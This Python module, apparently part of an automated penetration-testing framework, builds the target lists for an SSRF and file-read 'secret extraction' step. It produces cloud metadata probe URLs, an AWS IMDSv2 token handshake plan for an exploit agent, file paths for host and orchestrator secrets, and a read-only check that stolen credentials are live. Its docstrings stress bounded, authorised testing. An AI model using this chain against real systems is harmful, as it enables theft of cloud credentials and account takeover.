"""Substrate metadata reference pack loader (design/ARCHITECTURE.md §15).

The infrastructure & secret-extraction chain is generic across clouds/orchestrators
*because the per-substrate facts are data* (`catalog/substrates.yaml`), not engine logic
(decisions D1/D3/D11). This module loads that pack and exposes the data-driven probe
targets the SSRF/EXTRACT step aims at — endpoints, required headers, the AWS IMDSv2
handshake, and the credential paths — plus a fingerprint-based hint of which substrate is
in play. Versioned + `as_of`-stamped so the start-of-loop intel refresh (§5) keeps it
current. Pure logic; `load` returns {} on any failure (workers never raise).
"""

from __future__ import annotations

import json
import os

try:
    import yaml
except ImportError:  # pragma: no cover
    yaml = None


def substrates_path() -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    repo = os.path.dirname(os.path.dirname(here))
    return os.environ.get("SC_SUBSTRATES", os.path.join(repo, "catalog", "substrates.yaml"))


def load(path: str | None = None) -> dict:
    """Load the pack: {version, as_of, source, substrates:[...]}. Returns {} on failure."""
    path = path or substrates_path()
    try:
        with open(path) as fh:
            text = fh.read()
        data = yaml.safe_load(text) if yaml else json.loads(text)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def version(pack: dict) -> str:
    """The pack edition marker carried into the report (§15 freshness rule)."""
    return f"substrates@v{pack.get('version', 0)} ({pack.get('as_of', '?')})"


def entries(pack: dict) -> list:
    return [e for e in (pack.get("substrates") or []) if isinstance(e, dict)]


def lookup(pack: dict, sid: str) -> dict | None:
    return next((e for e in entries(pack) if e.get("id") == sid), None)


def imds_probe_targets(pack: dict) -> list:
    """The data-driven HTTP probe list for the §15 SSRF/EXTRACT step (cloud metadata).

    One entry per (substrate × endpoint × HTTP credential_path): the URL to reach over
    SSRF, the header to send (or null), the IMDSv2-style handshake to run first (or null).
    File-system secrets are NOT here — see ``file_secret_targets`` (§15 distinguishes
    metadata-via-SSRF from host/orchestrator secrets reached by file-read/code-exec)."""
    out = []
    for e in entries(pack):
        for host in e.get("endpoints") or []:
            for cred in e.get("credential_paths") or []:
                url = cred if cred.startswith("http") else f"http://{host}{cred if cred.startswith('/') else '/' + cred}"
                out.append({
                    "substrate": e.get("id"),
                    "family": e.get("family"),
                    "access": "http",
                    "url": url,
                    "header": e.get("header"),
                    "handshake": e.get("handshake"),
                    "cred_path": cred,
                })
    return out


def file_secret_targets(pack: dict) -> list:
    """The data-driven file-read list for §15 "orchestrator/host secrets" — paths read via
    file-read/LFI or the code-exec sandbox (NOT via SSRF). One entry per (substrate × file_path)."""
    out = []
    for e in entries(pack):
        for path in e.get("file_paths") or []:
            out.append({"substrate": e.get("id"), "family": e.get("family"),
                        "access": "file", "path": path})
    return out


def _hdr(h) -> dict:
    if not h or ":" not in str(h):
        return {}
    k, v = str(h).split(":", 1)
    return {k.strip(): v.strip()}


def imdsv2_plan(entry: dict) -> list:
    """Ordered request steps to read a credential under the substrate's handshake (§15/D11).

    AWS IMDSv2 -> [PUT token (capturing the token header), then GET each cred path sending
    that token header]; substrates with a static header -> a single GET per path with the
    header; no header -> a plain GET. Returns step dicts the exploit agent executes in order."""
    steps, token_header = [], None
    hs = entry.get("handshake")
    if hs:
        steps.append({"method": hs.get("method", "PUT"), "url": hs.get("url"),
                      "headers": _hdr(hs.get("request_header")),
                      "captures": hs.get("response_token_header")})
        token_header = hs.get("response_token_header")
    for host in entry.get("endpoints") or []:
        for cred in entry.get("credential_paths") or []:
            headers = _hdr(entry.get("header"))
            if token_header:
                headers[token_header] = "${token}"      # substituted from the handshake capture
            url = cred if cred.startswith("http") else f"http://{host}{cred if cred.startswith('/') else '/' + cred}"
            steps.append({"method": "GET", "url": url, "headers": headers})
    return steps


_REPLAY = {
    "aws": "aws sts get-caller-identity (read-only) from OUTSIDE the target",
    "gcp": "GET the access token's tokeninfo (read-only)",
    "azure": "GET management.azure.com/subscriptions (read-only list)",
    "oci": "GET the instance-principal whoami (read-only)",
}


def replay_check(sid: str) -> dict:
    """The BOUNDED, read-only validation that proves an extracted credential is live, run
    from OUTSIDE the victim (§15 / D11). Confirms validity ONLY — never roams the account;
    the campaign confirms-and-halts at the substrate boundary."""
    return {"substrate": sid, "bounded": True, "read_only": True,
            "check": _REPLAY.get(sid, "a single read-only identity/introspection call")}


def infer(pack: dict, signals: str) -> list:
    """Best-effort: which substrates the recon/stack signals suggest are in play, so the
    chain probes the likely ones first. ``signals`` is any blob (headers + tech, lowercased
    by us). Returns matching substrate ids (may be empty -> probe all)."""
    blob = (signals or "").lower()
    hits = []
    for e in entries(pack):
        if any(h.lower() in blob for h in (e.get("fingerprint_hints") or [])):
            hits.append(e.get("id"))
    return hits
